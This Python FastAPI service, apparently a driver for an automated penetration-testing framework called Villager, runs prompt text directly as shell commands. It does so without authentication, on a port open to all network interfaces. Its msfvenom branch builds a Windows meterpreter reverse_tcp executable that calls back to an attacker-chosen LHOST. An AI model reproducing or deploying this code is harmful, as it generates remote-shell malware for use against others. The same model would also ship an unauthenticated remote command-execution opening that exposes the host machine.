#!/usr/bin/env python3
"""
Kali Driver Service for Villager - Native WSL Execution
This service executes security tool commands directly on the local system
(WSL / Linux) instead of spinning up Docker containers.

Commands run as local subprocess calls in the workspace directory.
"""

from fastapi import FastAPI
import uvicorn
import subprocess
import json
import os
import re
import time
from typing import Dict, Optional

app = FastAPI(title="Villager Kali Driver Service - Native WSL")

# Ensure workspace directory exists
WORKSPACE_DIR = os.getenv("VILLAGER_WORKSPACE", "/tmp/villager_workspace")
os.makedirs(WORKSPACE_DIR, exist_ok=True)

# Track command history for status reporting
command_history: list = []


def execute_local(command: str, timeout: int = 300) -> dict:
    """Execute a command directly on the local system."""
    try:
        print(f"Executing locally: {command}")
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=WORKSPACE_DIR,
        )

        entry = {
            "command": command,
            "timestamp": time.time(),
            "success": result.returncode == 0,
        }
        command_history.append(entry)

        return {
            "success": True,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        }

    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": f"Command timed out after {timeout} seconds",
            "stdout": "",
            "stderr": "",
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "stdout": "",
            "stderr": "",
        }


@app.post("/")
async def kali_request(request: dict):
    """Handle Kali Driver requests using native local execution."""
    prompt = request.get("prompt", "")

    print(f"Kali Driver received request: {prompt[:100]}...")

    # Check if this is a msfvenom request
    if "msfvenom" in prompt.lower():
        try:
            # Extract parameters from prompt
            lhost = "192.168.1.100"  # Default LHOST
            lport = "4444"           # Default LPORT
            payload = "windows/meterpreter/reverse_tcp"  # Default payload
            output_file = "payload.exe"

            # Try to extract LHOST and LPORT from prompt
            lhost_match = re.search(r'LHOST[=:]\s*(\d+\.\d+\.\d+\.\d+)', prompt, re.IGNORECASE)
            lport_match = re.search(r'LPORT[=:]\s*(\d+)', prompt, re.IGNORECASE)

            if lhost_match:
                lhost = lhost_match.group(1)
            if lport_match:
                lport = lport_match.group(1)

            # Build msfvenom command
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"

            # Execute locally
            result = execute_local(cmd)

            if result["success"]:
                response = {
                    "content": f"✅ Kali Driver executed msfvenom locally!\n"
                              f"📁 Output file: {output_file}\n"
                              f"🔧 Command: {cmd}\n"
                              f"📝 Output: {result['stdout']}\n"
                              f"⚠️  Errors: {result['stderr']}",
                    "done": True
                }
            else:
                response = {
                    "content": f"❌ Kali Driver error: {result.get('error', 'Unknown error')}\n"
                              f"📝 Output: {result['stdout']}\n"
                              f"⚠️  Errors: {result['stderr']}",
                    "done": True
                }
        except Exception as e:
            response = {
                "content": f"❌ Kali Driver error: {str(e)}",
                "done": True
            }
    else:
        # For other security tools, execute locally
        try:
            result = execute_local(prompt)
            response = {
                "content": f"✅ Kali Driver executed locally: {prompt}\n"
                          f"📝 Output: {result['stdout']}\n"
                          f"⚠️  Errors: {result['stderr']}",
                "done": True
            }
        except Exception as e:
            response = {
                "content": f"❌ Kali Driver error: {str(e)}",
                "done": True
            }

    return response


@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "service": "kali_driver",
        "mode": "native_wsl",
        "workspace": WORKSPACE_DIR,
        "commands_executed": len(command_history),
    }


if __name__ == "__main__":
    print("Starting Villager Kali Driver Service (Native WSL) on port 1611...")
    print(f"🐧 Executing commands directly on the local system")
    print(f"📂 Workspace: {WORKSPACE_DIR}")
    uvicorn.run(app, host="0.0.0.0", port=1611)